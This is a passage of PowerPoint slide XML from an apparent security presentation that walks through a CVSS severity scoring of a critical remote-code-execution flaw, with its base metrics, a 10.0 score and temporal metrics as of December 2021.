              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The intrinsic, constant qualities of the flaw. Constant everywhere.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="2834640"/>
            <a:ext cx="3566160" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3462"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4636008" y="3108960"/>
            <a:ext cx="3017520" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Temporal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4636008" y="3749040"/>
            <a:ext cx="3017520" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>How the real-world threat evolves — exploit maturity, fixes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="2834640"/>
            <a:ext cx="3566160" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3462"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8403336" y="3108960"/>
            <a:ext cx="3017520" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Environmental</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8403336" y="3749040"/>
            <a:ext cx="3017520" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Tailored to your deployment — where the flaw actually lives.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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BASE METRICS — MY DETERMINATION</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Every metric, justified from how it works</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9692640" y="548640"/>
            <a:ext cx="1920240" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>10.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9692640" y="1371600"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CRITICAL</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2468880"/>
                <a:gridCol w="2103120"/>
                <a:gridCol w="6519672"/>
              </a:tblGrid>
              <a:tr h="0">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Metric</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101826"/>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Value</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101826"/>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Why I chose it</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101826"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Attack Vector</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Network</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50" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Reachable across the network via any logged input</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0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Attack Complexity</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450" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Low</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450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>One request; reliable public exploits, no special conditions</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Privileges Required</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>None</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50" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No account or authentication needed</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0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>User Interaction</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450" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>None</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450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Logging is automatic — no victim action</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Scope</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Changed</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50" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Breaks out of the library to the host and beyond</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0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>C / I / A impact</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450" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>High / High / High</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450" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Full code execution — total data, integrity &amp; uptime loss</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r>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5806440"/>
            <a:ext cx="11094415" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="101826"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5943600"/>
            <a:ext cx="10972800" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vector string:   </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FD1A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TEMPORAL METRICS</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>How the threat looked in December 2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9966960" y="548640"/>
            <a:ext cx="1645920" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9.5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9966960" y="1371600"/>
            <a:ext cx="1645920" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CRITICAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2148840"/>
            <a:ext cx="3566160" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3913"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2377440"/>
            <a:ext cx="3108960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>E: High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2880360"/>
            <a:ext cx="3108960" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploit maturity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3291840"/>
            <a:ext cx="3108960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Weaponised exploits &amp; mass scanning within a day</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="2148840"/>
            <a:ext cx="3566160" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3913"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2377440"/>
            <a:ext cx="3108960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RL: Official</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
